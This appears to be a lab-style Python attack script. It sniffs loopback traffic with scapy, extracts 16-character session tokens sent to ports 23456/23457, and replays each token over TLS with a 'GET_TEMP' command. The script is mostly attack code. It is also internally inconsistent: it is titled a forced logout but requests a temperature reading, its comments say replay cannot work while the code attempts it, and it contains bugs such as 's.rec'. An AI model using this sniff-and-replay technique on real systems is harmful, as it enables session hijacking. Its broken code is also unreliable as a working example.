#Vulnerability Name - Forced Logout
#This will listen for a token in the network (in this case lo) and force a logout anytime it detects one.
#Use SSLClient.py to test

import socket
import ssl
from scapy.all import *

def print_pkt(pkt):

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_verify_locations('./certificate.pem')


    payload = pkt["TCP"].payload

    print(pkt["TCP"].dport)

    if len(payload) != 0:
        print("PAYLOAD:##" + str(payload) + "##")


    # since the data is encrypted we will never see a cleartext command in our sniffing.
    # Wont be able to replay the token

    try:
        token = payload.split(";")[0]

        if len(token) == 16 and (pkt["TCP"].dport == 23456 or pkt["TCP"].dport == 23457):
            print("TOKEN HERE: " + str(token))

            with socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM) as sock:
            
                s = ssl.wrap_socket(sock)

                s.connect(('',pkt["TCP"].dport))
            
                execute = "%s;GET_TEMP" % token

                s.send(execute.encode("utf-8"))

                msg = s.rec(1024)

                print(str(pkt["TCP"].dport) + " -- TEMP READING: " + str(msg.strip().decode("utf-8")))

    except Exception as e:
        pass
                
load_layer("tls")
pkt = sniff(iface="lo",filter="tcp and (port 23456 or port 23457)", prn=print_pkt)
